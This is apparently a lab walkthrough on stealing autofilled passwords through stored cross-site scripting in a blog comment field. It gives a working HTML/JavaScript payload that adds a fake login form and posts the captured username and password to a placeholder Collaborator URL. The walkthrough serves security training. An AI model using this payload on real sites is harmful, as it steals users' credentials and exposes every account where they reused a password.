## üîê Using Cross-Site Scripting to Steal Passwords

Nowadays, many users have password managers that automatically fill in their passwords. You can exploit this by creating a password input field, capturing the autofilled password, and sending it to your domain. This method avoids most issues associated with cookie theft and can even access any other account where the victim reused the same password.

The main limitation of this method is that it only works for users who have a password manager that performs autofill. (Of course, if the user doesn‚Äôt have a saved password, you can still attempt to obtain their password through a phishing attack on the site, but this is not quite the same.)

### üî¨ Example Lab: Stealing a Password Using XSS
This lab contains a stored XSS vulnerability in the blog comment function. A simulated victim user views all comments after they are posted. To solve this lab, exploit the vulnerability to steal the victim‚Äôs username and password, and then use these credentials to log into the victim‚Äôs account.

### Steps:

1. Navigate to any post and scroll down to the comment form:

   ![image](https://github.com/user-attachments/assets/3071b40a-9a9b-43c0-b3b4-017ccb49e5c2)

2. Submit the following payload in a blog comment, replacing the placeholder with your Burp Collaborator subdomain:

   ```html
   <form>
     <input type="text" name="username" id="username" autocomplete="username">
     <input type="password" name="password" autocomplete="current-password"
     onchange="if(this.value.length) {
       fetch('https://YOUR-COLLABORATOR-URL', {
         method: 'POST',
         mode: 'no-cors',
         body: 'username=' + encodeURIComponent(document.getElementById('username').value) +
               '&password=' + encodeURIComponent(this.value)
       });
     }">
   </form>
   ```

3. In the Collaborator, you will see the user‚Äôs credentials (username and password) in the HTTP request:

   ![image](https://github.com/user-attachments/assets/c239c04f-d60b-49ff-9700-ff5f4130ec6b)
